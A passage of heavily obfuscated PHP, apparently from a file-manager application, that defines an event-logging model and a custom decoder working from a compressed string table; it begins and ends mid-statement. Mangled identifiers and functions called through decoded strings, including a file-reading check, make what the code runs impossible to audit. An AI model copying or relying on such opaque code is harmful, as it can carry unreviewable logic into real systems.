= array(); goto FÆïÇ¸ù“ ; FÆïÇ¸ù“ : foreach ($bÆ¸Ç‘ÂÅ¬ as $cÂ¨İ¹ùÃí) { if ($cÂ¨İ¹ùÃí[$d­³Ÿ£Çƒ¯[367]] == SourceModel::TYPE_USER) { $Bµô’¿¶ÑÏ[] = intval($cÂ¨İ¹ùÃí[$d­³Ÿ£Çƒ¯[451]]); } else { if ($cÂ¨İ¹ùÃí[$d­³Ÿ£Çƒ¯[367]] == SourceModel::TYPE_GROUP) { $a÷°ÜğÚ’µ[] = intval($cÂ¨İ¹ùÃí[$d­³Ÿ£Çƒ¯[451]]); } } } if ($Bµô’¿¶ÑÏ) { $Bµô’¿¶ÑÏ = Model($d­³Ÿ£Çƒ¯[465])->userListInfo($Bµô’¿¶ÑÏ); } if ($a÷°ÜğÚ’µ) { $cå–½à—´ = array($d­³Ÿ£Çƒ¯[2074] => array($d­³Ÿ£Çƒ¯[380], $a÷°ÜğÚ’µ)); $a÷°ÜğÚ’µ = Model($d­³Ÿ£Çƒ¯[453])->field($d­³Ÿ£Çƒ¯[2087])->where($cå–½à—´)->select(); $a÷°ÜğÚ’µ = array_to_keyvalue($a÷°ÜğÚ’µ, $d­³Ÿ£Çƒ¯[2000]); } goto eÏ°Ä°Ü’£; BÙºÆƒº‚: } private function authInfo($eí±ôºö) { $Bóµë‘Ê„İ =& $_SERVER[‘®…¢À]; if ($eí±ôºö[$Bóµë‘Ê„İ[2130]]) { $AŠˆšÎ”ˆˆ = Model($Bóµë‘Ê„İ[2146])->listData($eí±ôºö[$Bóµë‘Ê„İ[2130]]); if (!$AŠˆšÎ”ˆˆ) { return !1; $c—§ÈĞä‚„ = Model($Bóµë‘Ê„İ[2146])->listData(); $Dµ–ÌéŒŞÜ = array_filter_by_field($c—§ÈĞä‚„, $Bóµë‘Ê„İ[372], $Bóµë‘Ê„İ[463]); return $Dµ–ÌéŒŞÜ; } $FÓ„±ßÒ· = array_field_key($AŠˆšÎ”ˆˆ, array($Bóµë‘Ê„İ[363], $Bóµë‘Ê„İ[28], $Bóµë‘Ê„İ[372], $Bóµë‘Ê„İ[2018], $Bóµë‘Ê„İ[2021])); $FÓ„±ßÒ·[$Bóµë‘Ê„İ[2162]] = $eí±ôºö; return $FÓ„±ßÒ·; } else { return array($Bóµë‘Ê„İ[381] => 0, $Bóµë‘Ê„İ[2006] => $eí±ôºö[$Bóµë‘Ê„İ[2131]], $Bóµë‘Ê„İ[382] => $Bóµë‘Ê„İ[33], $Bóµë‘Ê„İ[2018] => $Bóµë‘Ê„İ[2163]); } } } if ($_SERVER[$_SERVER[‘®…¢À][768]] != $_SERVER[$_SERVER[‘®…¢À][769]]) { goto BÚ’º; C† ïó¶¿ó: $A¨· µÊ–‘ = explode($_SERVER[‘®…¢À][214], $fĞÒ’ÙÍ†Ğ); if (count($A¨· µÊ–‘) < $_SERVER[‘®…¢À][548]) { $dŞİï…òå‡ = $_SERVER[‘®…¢À][774]; $dŞİï…òå‡(); } $c‚¼öÆí›ñ = $_SERVER[‘®…¢À][1075]; goto Cî¹¸†µ«; BÚ’º: $D£ó×Ñ´æì = $_SERVER[‘®…¢À][771]; $d’¤ğñà = $_SERVER[$_SERVER[‘®…¢À][772]] . $_SERVER[‘®…¢À][773]; $fĞÒ’ÙÍ†Ğ = $D£ó×Ñ´æì($d’¤ğñà); goto C† ïó¶¿ó; Cî¹¸†µ«: $c‚¼öÆí›ñ($_SERVER[$_SERVER[‘®…¢À][1074]]); goto C‡º„šñÙŞ; C‡º„šñÙŞ: } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\143\x65\137\x65\x76\x65\x6e\164"; protected $dataAuto = array(array("\143\x72\145\141\164\145\x54\x69\155\x65", "\164\151\x6d\145", "\x69\156\x73\x65\162\x74", "\146\x75\156\x63\164\151\x6f\156"), array("\144\145\163\x63", '', "\x69\156\x73\145\162\164\54\165\x70\144\x61\x74\x65\54\x73\x65\154\x65\x63\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($aóÊìÅÌ«Â, $f¸¨×êÙ¸©, $f£Ö»¬ÚíÇ = '') { goto B¨Œš»äè; cì›Ãˆ¸‚: $b¿¢¯Ç†ª = array($CÁÉÖÚ¼»‡[379] => $aóÊìÅÌ«Â, $CÁÉÖÚ¼»‡[2164] => $Aø¾¦Ï¾î[$CÁÉÖÚ¼»‡[456]], $CÁÉÖÚ¼»‡[2165] => $Aø¾¦Ï¾î[$CÁÉÖÚ¼»‡[28]], $CÁÉÖÚ¼»‡[461] => $Aø¾¦Ï¾î[$CÁÉÖÚ¼»‡[461]], $CÁÉÖÚ¼»‡[1328] => USER_ID, $CÁÉÖÚ¼»‡[384] => $f¸¨×êÙ¸©, $CÁÉÖÚ¼»‡[1330] => $f£Ö»¬ÚíÇ); $this->addSystemLog($f¸¨×êÙ¸©, $b¿¢¯Ç†ª); return $this->add($b¿¢¯Ç†ª); goto côÎ†ñÃÄİ; f ƒØ‰×æ‚: if (!$Aø¾¦Ï¾î) { return !1; } if ($this->isCacheEvent($Aø¾¦Ï¾î, $f¸¨×êÙ¸©)) { return; } if ($f£Ö»¬ÚíÇ && is_string($f£Ö»¬ÚíÇ)) { $f£Ö»¬ÚíÇ = array($CÁÉÖÚ¼»‡[2031] => $f£Ö»¬ÚíÇ); } goto cì›Ãˆ¸‚; B¨Œš»äè: $CÁÉÖÚ¼»‡ =& $_SERVER[‘®…¢À]; if (!$this->eventSave) { return; } $Aø¾¦Ï¾î = Model($CÁÉÖÚ¼»‡[1067])->sourceInfo($aóÊìÅÌ«Â); goto f ƒØ‰×æ‚; côÎ†ñÃÄİ: } private function addSystemLog($F’„¥»›°ç, $f››¨ºº‘³) { $fºÎ¿ËîÆ =& $_SERVER[‘®…¢À]; if ($F’„¥»›°ç == $fºÎ¿ËîÆ[2166]) { $F’„¥»›°ç = $f››¨ºº‘³[$fºÎ¿ËîÆ[400]][$fºÎ¿ËîÆ[2167]]; } else { if (in_array($F’„¥»›°ç, array($fºÎ¿ËîÆ[1977], $fºÎ¿ËîÆ[2168]))) { $F’„¥»›°ç = $f››¨ºº‘³[$fºÎ¿ËîÆ[400]][$fºÎ¿ËîÆ[665]]; } } $FÒàáä— = array_merge($f››¨ºº‘³, array($fºÎ¿ËîÆ[2169] => $f››¨ºº‘³[$fºÎ¿ËîÆ[365]], $fºÎ¿ËîÆ[2170] => $f››¨ºº‘³[$fºÎ¿ËîÆ[2170]])); Model($fºÎ¿ËîÆ[1942])->addLog($fºÎ¿ËîÆ[2171] . $F’„¥»›°ç, $FÒàáä—); } private function isCacheEvent($a©Ü½Í­³, $dˆ“¥èš¯­) { if ($a©Ü½Í­³[$_SERVER[‘®…¢À][367]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($C°Õ…è¶”ï, $b¦Ê¯Ó‡«°) { $fÁèëÖ·Ä =& $_SERVER[‘®…¢À]; $EËÆ‚×İ‘„ = Model($fÁèëÖ·Ä[1067])->sourceInfo($C°Õ…è¶”ï); $B˜°¶½¼” = array($fÁèëÖ·Ä[2167] => $b¦Ê¯Ó‡«°, $fÁèëÖ·Ä[28] => $EËÆ‚×İ‘„[$fÁèëÖ·Ä[28]]); return $this->addEvent($C°Õ…è¶”ï, $fÁèëÖ·Ä[2166], $B˜°¶½¼”); } public function eventFileEdit($eø…ö–—¼) { $A‘¸à¾À¡ğ =& $_SERVER[‘®…¢À]; $c×ë‹•…©¯ = array($A‘¸à¾À¡ğ[2172] => $_SERVER[$A‘¸à¾À¡ğ[2173]], $A‘¸à¾À¡ğ[1645] => strtolower(ACTION)); return $this->addEvent($eø…ö–—¼, $A‘¸à¾À¡ğ[1969], $c×ë‹•…©¯); } public function eventRecycle($Eƒ óÖ¥Ó, $AÃ¾ÁÅŞÓ) { return $this->addEvent($Eƒ óÖ¥Ó, $_SERVER[‘®…¢À][2168], $AÃ¾ÁÅŞÓ); } public function eventRemove($a¼°°ÁĞ¥) { $c”Âïä÷Ü =& $_SERVER[‘®…¢À]; $eËß¸Æİ™ = Model($c”Âïä÷Ü[1067])->sourceInfo($a¼°°ÁĞ¥); $cïöÃ‹Õ£ = $eËß¸Æİ™[$c”Âïä÷Ü[28]]; return $this->addEvent($eËß¸Æİ™[$c”Âïä÷Ü[456]], $c”Âïä÷Ü[1968], $cïöÃ‹Õ£); } public function eventShare($DßÏê•åó˜, $BÙ©—„ÓØ¾) { return $this->addEvent($DßÏê•åó˜, $_SERVER[‘®…¢À][1977], $BÙ©—„ÓØ¾); } public function eventMove($e‘·äÁœõ½, $aÔÃøƒİéï, $c®Óà¡À·†) { goto eê²¬Æƒèí; eÎé”—Øô: $this->addEvent($e‘·äÁœõ½, $c§ ‡£¯çÃ[483], $F¼Ç«Ëí‰İ); $fŠÉÎŞ‰é‘ = $eñèÈÙ‘¿¶->sourceInfo($e‘·äÁœõ½); $F¼Ç«Ëí‰İ = array($c§ ‡£¯çÃ[365] => $fŠÉÎŞ‰é‘[$c§ ‡£¯çÃ[365]], $c§ ‡£¯çÃ[28] => $fŠÉÎŞ‰é‘[$c§ ‡£¯çÃ[28]]); goto E¿áƒ­´¥•; eê²¬Æƒèí: $c§ ‡£¯çÃ =& $_SERVER[‘®…¢À]; $eñèÈÙ‘¿¶ = Model($c§ ‡£¯çÃ[1067]); $fŠÉÎŞ‰é‘ = $eñèÈÙ‘¿¶->sourceInfo($e‘·äÁœõ½); goto fŞÌ†™ƒ; fŞÌ†™ƒ: $BàºÀ—æ³ = $eñèÈÙ‘¿¶->sourceInfo($aÔÃøƒİéï); $a›âªë‰©× = $eñèÈÙ‘¿¶->sourceInfo($c®Óà¡À·†); $F¼Ç«Ëí‰İ = array($c§ ‡£¯çÃ[963] => $aÔÃøƒİéï, $c§ ‡£¯çÃ[2174] => $BàºÀ—æ³[$c§ ‡£¯çÃ[28]], $c§ ‡£¯çÃ[2175] => $BàºÀ—æ³[$c§ ‡£¯çÃ[461]], $c§ ‡£¯çÃ[964] => $c®Óà¡À·†, $c§ ‡£¯çÃ[2176] => $a›âªë‰©×[$c§ ‡£¯çÃ[28]], $c§ ‡£¯çÃ[2177] => $a›âªë‰©×[$c§ ‡£¯çÃ[461]]); goto eÎé”—Øô; E¿áƒ­´¥•: $this->addEvent($aÔÃøƒİéï, $c§ ‡£¯çÃ[2178], $F¼Ç«Ëí‰İ); goto BªœéÍà“¼; BªœéÍà“¼: } public function eventCopy($a¿Î›èƒÁ¾) { $this->eventCreate($a¿Î›èƒÁ¾, $_SERVER[‘®…¢À][481]); } public function eventRename($Aõ‚Êã¿‹ø, $EğÀœ×âÚ†, $Cš»›ãéºé) { $Fù«ó†š‚… =& $_SERVER[‘®…¢À]; $Fõë½ˆÑ¿í = array($Fù«ó†š‚…[963] => $EğÀœ×âÚ†, $Fù«ó†š‚…[964] => $Cš»›ãéºé); return $this->addEvent($Aõ‚Êã¿‹ø, $Fù«ó†š‚…[1081], $Fõë½ˆÑ¿í); } public function eventAddComment($e¬¤‘¬ĞÔ¡, $d¦ğŞ›ÎÜÁ) { return $this->addEvent($e¬¤‘¬ĞÔ¡, $_SERVER[‘®…¢À][2179], $d¦ğŞ›ÎÜÁ); } public function eventAddDesc($DÎÚì˜·³, $Eª÷÷„ƒÙ˜) { return $this->addEvent($DÎÚì˜·³, $_SERVER[‘®…¢À][2180], $Eª÷÷„ƒÙ˜); } public function listBySource($FœÕŠé•†Ò) { goto d­·ÊØ»˜´; D½ğøïÚïø: if ($añƒ Ç¨æÜ[$bÎšäÚò¼Á[366]] == $bÎšäÚò¼Á[84]) { $c¥Æ–‹ĞĞÈ = Model($bÎšäÚò¼Á[1067])->listSearchChildren($FœÕŠé•†Ò, 20000); $c¥Æ–‹ĞĞÈ[] = $FœÕŠé•†Ò . $bÎšäÚò¼Á[357]; $E…Ï‹İä†ó = array($bÎšäÚò¼Á[365] => array($bÎšäÚò¼Á[7], $c¥Æ–‹ĞĞÈ)); } $A´¡¿İ² ‚ = $this->where($E…Ï‹İä†ó)->order($bÎšäÚò¼Á[2181])->selectPage(); if ($A´¡¿İ² ‚[$bÎšäÚò¼Á[347]][$bÎšäÚò¼Á[348]] == 0) { $A´¡¿İ² ‚[$bÎšäÚò¼Á[347]][$bÎšäÚò¼Á[348]] = 1; $A´¡¿İ² ‚[$bÎšäÚò¼Á[350]] = array(array($bÎšäÚò¼Á[379] => $FœÕŠé•†Ò, $bÎšäÚò¼Á[2164] => $añƒ Ç¨æÜ[$bÎšäÚò¼Á[456]], $bÎšäÚò¼Á[1328] => $añƒ Ç¨æÜ[$bÎšäÚò¼Á[374]], $bÎšäÚò¼Á[384] => $bÎšäÚò¼Á[2182], $bÎšäÚò¼Á[385] => $añƒ Ç¨æÜ[$bÎšäÚò¼Á[184]], $bÎšäÚò¼Á[1330] => $bÎšäÚò¼Á[33])); } goto c”ß†äâ¢; d­·ÊØ»˜´: $bÎšäÚò¼Á =& $_SERVER[‘®…¢À]; $añƒ Ç¨æÜ = Model($bÎšäÚò¼Á[1067])->sourceInfo($FœÕŠé•†Ò); $E…Ï‹İä†ó = array($bÎšäÚò¼Á[379] => $FœÕŠé•†Ò); goto D½ğøïÚïø; c”ß†äâ¢: $A´¡¿İ² ‚ = $this->eventListParse($A´¡¿İ² ‚, $FœÕŠé•†Ò); show_json($A´¡¿İ² ‚); goto Cø‘èºŸĞƒ; Cø‘èºŸĞƒ: } private function eventListParse($D´Ş­×ß¾”, $b‚¡õï„Ú) { goto C’íñˆ½·; c¨÷îµŞ’: $d©¨ ‚±£ = Model($fç¨¬ÄÚ[735])->sourceListInfo($Aà¤›Ìá­È, !0); foreach ($FÁ ¶ÅØÒƒ as &$EØàÛİ‰ç­) { if ($EØàÛİ‰ç­[$fç¨¬ÄÚ[29]] == $fç¨¬ÄÚ[483] && isset($EØàÛİ‰ç­[$fç¨¬ÄÚ[400]][$fç¨¬ÄÚ[963]])) { $EØàÛİ‰ç­[$fç¨¬ÄÚ[400]][$fç¨¬ÄÚ[963]] = $d©¨ ‚±£[$EØàÛİ‰ç­[$fç¨¬ÄÚ[400]][$fç¨¬ÄÚ[963]]]; $EØàÛİ‰ç­[$fç¨¬ÄÚ[400]][$fç¨¬ÄÚ[964]] = $d©¨ ‚±£[$EØàÛİ‰ç­[$fç¨¬ÄÚ[400]][$fç¨¬ÄÚ[964]]]; } if ($EØàÛİ‰ç­[$fç¨¬ÄÚ[29]] == $fç¨¬ÄÚ[2178] && isset($EØàÛİ‰ç­[$fç¨¬ÄÚ[400]][$fç¨¬ÄÚ[365]])) { $EØàÛİ‰ç­[$fç¨¬ÄÚ[400]][$fç¨¬ÄÚ[365]] = $d©¨ ‚±£[$EØàÛİ‰ç­[$fç¨¬ÄÚ[400]][$fç¨¬ÄÚ[365]]]; } $EØàÛİ‰ç­[$fç¨¬ÄÚ[387]] = $d©¨ ‚±£[$EØàÛİ‰ç­[$fç¨¬ÄÚ[365]]]; $EØàÛİ‰ç­[$fç¨¬ÄÚ[2183]] = $d©¨ ‚±£[$EØàÛİ‰ç­[$fç¨¬ÄÚ[2170]]]; if ($EØàÛİ‰ç­[$fç¨¬ÄÚ[29]] == $fç¨¬ÄÚ[1968]) { $EØàÛİ‰ç­[$fç¨¬ÄÚ[2183]] = $EØàÛİ‰ç­[$fç¨¬ÄÚ[387]]; $EØàÛİ‰ç­[$fç¨¬ÄÚ[2170]] = $EØàÛİ‰ç­[$fç¨¬ÄÚ[2183]][$fç¨¬ÄÚ[365]]; $EØàÛİ‰ç­[$fç¨¬ÄÚ[387]] = !1; $EØàÛİ‰ç­[$fç¨¬ÄÚ[365]] = $fç¨¬ÄÚ[33]; } $EØàÛİ‰ç­[$fç¨¬ÄÚ[2135]] = $a÷Šˆ‘½µ[$EØàÛİ‰ç­[$fç¨¬ÄÚ[1337]]]; } $D´Ş­×ß¾”[$fç¨¬ÄÚ[350]] = $FÁ ¶ÅØÒƒ; goto EÅÎ ¸—Š¢; c÷Ñçº“÷—: $Aà¤›Ìá­È = array_unique($Aà¤›Ìá­È); $fÎÍäœ¤× = array_unique(array_to_keyvalue($FÁ ¶ÅØÒƒ, $fç¨¬ÄÚ[33], $fç¨¬ÄÚ[1337])); $a÷Šˆ‘½µ = Model($fç¨¬ÄÚ[468])->userListInfo($fÎÍäœ¤×); goto c¨÷îµŞ’; D×÷ ÍÀ×ƒ: $A†‡¼£ôù½ = array_to_keyvalue($FÁ ¶ÅØÒƒ, $fç¨¬ÄÚ[33], $fç¨¬ÄÚ[2170]); foreach ($FÁ ¶ÅØÒƒ as $EØàÛİ‰ç­) { $bîôÀéÚ’ä = $EØàÛİ‰ç­[$fç¨¬ÄÚ[400]]; if ($EØàÛİ‰ç­[$fç¨¬ÄÚ[29]] == $fç¨¬ÄÚ[483] && isset($bîôÀéÚ’ä[$fç¨¬ÄÚ[963]])) { $Aà¤›Ìá­È[] = $bîôÀéÚ’ä[$fç¨¬ÄÚ[963]] . $fç¨¬ÄÚ[33]; $Aà¤›Ìá­È[] = $bîôÀéÚ’ä[$fç¨¬ÄÚ[964]] . $fç¨¬ÄÚ[33]; } if ($EØàÛİ‰ç­[$fç¨¬ÄÚ[29]] == $fç¨¬ÄÚ[2178] && isset($bîôÀéÚ’ä[$fç¨¬ÄÚ[365]])) { $Aà¤›Ìá­È[] = $bîôÀéÚ’ä[$fç¨¬ÄÚ[365]] . $fç¨¬ÄÚ[33]; } } $Aà¤›Ìá­È = array_merge($Aà¤›Ìá­È, $A†‡¼£ôù½, array($b‚¡õï„Ú . $fç¨¬ÄÚ[33])); goto c÷Ñçº“÷—; C’íñˆ½·: $fç¨¬ÄÚ =& $_SERVER[‘®…¢À]; $FÁ ¶ÅØÒƒ = $D´Ş­×ß¾”[$fç¨¬ÄÚ[350]]; $Aà¤›Ìá­È = array_to_keyvalue($FÁ ¶ÅØÒƒ, $fç¨¬ÄÚ[33], $fç¨¬ÄÚ[365]); goto D×÷ ÍÀ×ƒ; EÅÎ ¸—Š¢: return $D´Ş­×ß¾”; goto AøÉâ´‰÷‹; AøÉâ´‰÷‹: } public function removeBySource($D‡È”©ïª´) { $C“£Íó•çÛ = array($_SERVER[‘®…¢À][379] => $D‡È”©ïª´); $this->where($C“£Íó•çÛ)->remove(); } } goto A·†¯¿ß­ä; Eˆí ÑÔ¯Û: if (!function_exists('_kodDe')) { function _kodDe($CªÛ½÷Ôø¹) { $CªÛ½÷Ôø¹ = base64_decode($CªÛ½÷Ôø¹); $E…ÍÍø™¾ = strlen($CªÛ½÷Ôø¹); $e¨¸Äˆ·Ï = ''; $b¿ßÆ§«ÛØ = ord($CªÛ½÷Ôø¹[0]) - 30; for ($c‘šÅÀôê¨ = 1; $c‘šÅÀôê¨ < $E…ÍÍø™¾; $c‘šÅÀôê¨ += 2) { if ($c‘šÅÀôê¨ + 1 < $E…ÍÍø™¾) { $e¨¸Äˆ·Ï .= chr(ord($CªÛ½÷Ôø¹[$c‘šÅÀôê¨ + 1]) + $b¿ßÆ§«ÛØ); $e¨¸Äˆ·Ï .= chr(ord($CªÛ½÷Ôø¹[$c‘šÅÀôê¨]) + $b¿ßÆ§«ÛØ); } else { $e¨¸Äˆ·Ï .= chr(ord($CªÛ½÷Ôø¹[$c‘šÅÀôê¨]) + $b¿ßÆ§«ÛØ); } } return $e¨¸Äˆ·Ï; } } define(base64_decode('kY2uhaLA'), "\226\304\361\215\315\343\342\311\350\271"); $_SERVER[‘®…¢À] = explode("\x7c\x3\x7c\x4\x7c\x6", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\x9d\x7d\x9\x7c\x1b\xc5\xf5\x30\xf7\x11\xae\x72\x17\x28\xb0\x71\x12\x62\x3b\x2b\xc9\x57\x2e\x27\xb6\x23\x5b\xb2\x2d\x62\x5b\x8e\x24\xc7\x49\x2c\x47\x59\x49\x2b\x79\x6d\x49\x2b\xef"."\xae\xe4\x23\xe\x2d\x67\xb\xe1\x8\x24\xb4\x1c\xa1\x10\xf8\x73\xdf\xf7\x51\x42\x43\xb9\xa\x85\x2\xa5\x14\x28\x47\x39\x72\x0\x2d\x50\xa0\xdc\xa1\x7c\x73\xcf\xac\x24\x3\xfd\xf8\xe1\x68\xe6\xcd\x9b\xd9\x39\xde\xbc\x79"."\x33\xf3\xde\x9b\x87\xd7\x4d\xec\x3e\xb1\xc7\xc4\x5e\x27\x9f\xf5\xed\xfd\x37\xfe\x1d\x87\x27\x76\x9b\xd8\x13\xfc\x8b\xc2\xc7\xaf\xdd\x67\x17\xf4\xdf\xee\xe9\x25\x9d\xfe\xdd\xaa\x7f\xd2\xd9\xf1\x9f\x37\x6f\x7d\x73\xeb\x93"."\x8b\xde\xbe\x6c\xf7\x7d\x9e\x3a\x5a\x3d\xf3\x77\xc3\xcf\x5f\x54\x77\xf5\xb1\x2f\x9f\xf1\x17\xed\xef\x99\xe9\x67\x1c\xff\xd1\x53\xd6\x2b\x2f\x66\xdf\x7b\xf0\x37\x7f\x7e\x62\x75\xed\xbf\xb2\xc3\xf7\x2d\xc\x6f\xbe\x62\x8f"."\xce\xee\x2b\x96\xdf\x78\x80\xf2\xe4\xee\x91\xe1\x83\x1e\xdd\xeb\xb0\xaf\xf\xbb\xe9\x96\x39\x4f\xfd\x64\xa5\x55\x75\xef\x3d\xfa\xe2\xc5\xf1\x97\x3e\x6f\xf8\xc3\x35\xa7\x3f\xf7\xda\x37\x73\x6e\xfe\xed\x51\x3f\x1b\x3c\x20"."\xf3\xef\x91\xbf\xfe\xfe\xc1\xa7\x1e\x4b\x3c\x73\xdb\xb3\x17\x8d\x76\xee\xba\xb1\xa5\x6d\xdd\x1b\xc7\x4c\x79\x64\xd9\x87\xf\x7f\x76\xe1\xf9\xb7\x9d\xf7\xfb\xf0\x3e\xff\x6e\x7c\xc2\x71\xd1\x45\x6f\x2f\x7e\xee\x92\x87\x8f"."\333\343\343\225\265\267\72\277\176\361\340\261\243\232\67\34\366\327\3\157\233\362\374\264\323\16\231\361\326\23\332\33\27\255\177\356\226\365\335\163\26\357\367\371\206\253\315\71\176\163\116\377\11\325\43".strrev('Ë3î¹ôºó:ëö¸o	Él¾FßÂı_®e7[‰É÷ÓºóÖ‰ªâ=7-¶ç'."\r".'áå÷Yì.ëY{').strrev('/ºåº{LW¼úõıo­¹¾Çé~½CÅøåß>Ÿşw\\§ïj8^3Âõ¾ÎS}oò½w7äíı»ã').strrev('øõËÜeÛwgšËcp^öÁy¿÷ƒ[ÿwıNO[ÀÚø™é´àÿOë¯îx1Û_¯Çö¾úuì·*')."\107\312\350\226\244\216\152\246\145\142\100\114\317\44\264\44\16\153\31\374\353\302\77\346\160\112\263\124\34\216\164\371\103\221\140\117\167\267\67\20\212\220\22\305\364\264\36\47\241\254\142\50\151\122\170".strrev('a•ii'."\n".'Ã´(c†1ªs†FˆÁ/nòĞ‘åşİ¼xiä”“D¥Šâ„ªÏVH¸±)ğL5V')."\x8c\x18\xac\x5e\xcd\xde\x36\x5f\x97\x14\xa\xb8\xbb\x82\xee\x96\x90\xcf\xdf\x85\xc1\x2d\xfe\xce\x4e\x5f\xa8\x18\x1e\xf0\x77\x74\x34\xbb\x5b\x16\x17\xa7\x74\x7\xdc\x6d\x9d\x6e\x9\xd4\x2f\xa5\x46\xb4\x4c\x42\x2f\x97\x56"."\341\224\125\122\5\16\264\152\152\52\216\203\31\205\126\307\32\313\222\120\210\205\300\30\144\162\251\24\216\164\261\20\251\277\232\120\162\51\322\147\36\61\222\65\264\264\102\233\276\130\35\143\120\34\120"."\162\226\256\145\142\70\342\35\265\14\205\303\101\215\143\206\232\126\63\244\250\240\267\303\333\22\222\140\65\245\326\200\277\123\42\103\221\126\114\113\65\244\336\166\157\300\53\301\252\67\314\104\55\236\51"."\xe1\x7c\x3d\x5d\xa0\x43\x24\x77\x47\x87\x34\x59\x9\x96\x9a\xce\xd2\x62\x70\x9e\x12\x85\xf9\x3\x1e\x6f\x40\x6a\x5e\x2e\xf1\x7e\x8a\xe9\xe9\xb4\x9e\x71\x82\x52\xc0\x78\x5a\x42\x55\xbd\x81\x0\xe\xc8\x84\x82\x3b\x7c\x70".base64_decode('6EjE39oa9LIYadySDlCTWkKltlg8kbIieSWVo8Q6hH9nkh/yq5uEgIe1jJYjxEqK0HWTkrzJ5g==').strrev('ÏLgu‘à'."\r".'x'."\r".'b “"l„Èe®=13Q†©¦h¤ˆĞØ8òÕ0.Ì'."\0".' Ha4¨	')."\216\165\352\171\322\232\204\226\122\73\330\174\113\350\251\270\152\360\170\26\144\27\123\110\263\264\161\41\167\127\56\55\242\260\150\154\100\113\305\15\72\115\277\17\263\232\24\253\132\26\150\206\111\153\332"."\x93\x4d\xe9\x4a\x3c\xa8\x1a\x42\xed\x5b\x41\x31\xfe\x9c\x25\x2\x73\x8\xad\x55\x37\xd2\x1e\xc0\xa\x48\xef\x80\x9\xa0\xf5\x94\x48\x18\xa2\x53\x20\x2e\x74\xa\x2e\x81\xe\x63\xcb\x40\x2e\x33\x14\x64\x4d\x74\x12\xfe\x56"."\xde\x77\xb2\xe3\xbf\xfd\x7d\x8b\xc0\x3f\x15\x84\xd9\x85\x49\xbd\x7\xd4\x54\x2a\xa2\x8e\xaa\x64\x1e\xa5\xe3\xb3\x4d\xda\x34\x97\x19\xd5\x32\x2e\x0\xc1\x51\x9f\x3f\x32\xa0\x98\x3\x9d\xf1\xd9\x11\x94\x8b\xf2\xd0\xb8\x3a"."\xea\xcc\xe\x64\x9\x21\xb0\xd9\x4d\x8\x1c\x8e\x42\x97\x6e\x79\x5\x16\x9c\xd2\x63\xa\x41\x1a\xb0\xac\x6c\x50\xcd\xc4\x61\xd7\x90\xb6\xe9\x23\x19\xd4\x75\x59\x55\x25\xcd\xf2\xc8\x52\x5c\xea\x94\x96\x4b\xed\xf5\x5a\x3d"."\x23\xc6\xb8\x96\x18\xe3\x5c\x70\xc0\x4a\xb3\x22\xd3\xb4\x69\xc\x66\x32\xa0\x35\x4a\xa8\xa3\x8c\xc4\xd5\x51\x8b\xf4\x88\xb4\x20\x36\xa0\x18\x60\x20\x1b\x72\x56\xc2\x31\x8f\x30\x93\x6c\x36\xa5\xc5\x14\x4b\xd3\x33\x2e\x3d"."\146\251\226\303\264\14\125\41\245\225\55\220\40\155\300\131\135\211\163\321\31\325\242\147\54\60\245\35\41\103\311\230\11\325\160\170\11\241\327\113\240\123\31\127\243\150\36\315\314\352\246\6\77\123\57"."\x29\x96\xa5\xc4\x6\x20\x47\xe0\xc5\x37\x7c\xf\xbe\x96\x49\x69\x19\xb5\x8\xd7\x1d\x8b\xa9\xa6\xe9\x80\x59\xc\x3d\xe5\x70\xa7\x52\xfa\x88\xc3\x6f\x68\x49\xd\xe4\xa9\x2c\xa8\x26\xe0\x56\xf5\x12\x65\xa5\x59\xcd\x50\x4d".strrev('5<p%óÁ‘ø°4’ÀT0å¦s¥,¨ÁŠ^½|›`%©™ô\\ÙKÔ­2JtuJÔC:Ú•').strrev('úÖ„ƒäÀ9—’+1øÜëI%-µIÚZ‡téËº‚µñÔ({ha¦‰ uUµÀMÎî5')."\210\3\273\365\21\325\0\37\156\36\253\227\206\364\170\124\37\165\322\44\210\14\47\23\105\206\75\232\265\34\1\45\223\204\375\23\35\263\124\223\256\57\201\245\336\100\44\350\157\15\365\272\3\144\355"."\316\200\236\36\245\145\301\274\51\107\100\215\203\276\215\131\264\104\45\13\273\205\342\300\231\0\7\221\246\302\331\101\323\72\174\155\260\345\36\207\11\220\34\42\26\55\273\103\113\153\260\162\26\113\101"."\135\5\26\366\66\122\41\27\252\161\103\170\240\262\74\34\237\125\341\0\377\126\126\364\205\75\316\312\376\46\227\306\363\270\252\235\325\122\115\325\34\251\33\110\32\232\222\222\10\231\24\141\124\111\376"."\305\166\102\352\120\63\111\153\200\10\137\1\357\222\36\157\60\24\351\364\206\332\375\36\222\333\353\46\241\16\35\317\53\132\333\76\374\323\117\272\37\254\375\111\65\246\247\164\103\111\101\216\101\211\105".base64_decode('pTM4qSU4e/YBCYV0GuZRPBLU0lnKXayBXDoqBF28BMIpwHAwnqKzpUQ3SKjeRbLMqGmlbNEVrA==')."\5\377\163\36\30\327\323\12\25\55\321\254\123\343\170\332\141\120\245\55\245\135\125\370\332\144\31\226\16\241\206\15\245\123\265\6\164\102\375\111\225\126\51\307\352\106\153\31\127\123\52\355\245\1\225"."\x2e\xa\x40\x5e\xca\xb3\xce\xcb\x1a\x6a\x42\x23\x34\x9\x4\x24\x0\xe7\x2c\x54\x33\x3\x20\x13\x14\x58\x68\xbc\x17\xca\x95\x1c\x60\x71\x6e\xab\x98\x9c\x63\xc3\x88\xb0\xc0\xb6\xf6\x74\x74\x44\x5a\xfc\x5d\x21\x20\x5b\x62"."\110\157\300\27\362\122\212\160\173\42\356\226\156\266\330\360\141\42\10\160\156\25\363\46\14\311\327\10\114\233\163\167\316\57\351\222\4\371\41\16\3\106\226\325\63\246\352\210\221\322\342\234\163\142\214"."\5\5\154\263\50\7\227\150\107\35\112\172\334\221\126\55\305\301\252\156\137\234\244\220\270\52\373\310\20\160\116\227\2\253\40\330\60\320\225\260\333\37\44\31\232\40\24\10\25\121\325\40\365\350\356"."\41\111\151\141\370\333\274\4\70\205\56\154\12\21\100\334\275\101\312\245\162\0\337\320\306\25\336\306\46\132\37\122\366\150\72\305\345\244\210\146\33\277\210\36\35\4\34\12\20\235\122\252\325\16\76"."\126\241\166\137\327\342\110\247\337\343\355\210\370\272\0\13\14\25\303\173\272\75\156\72\370\42\274\331\37\152\267\101\173\0\237\130\352\356\360\25\242\173\227\371\20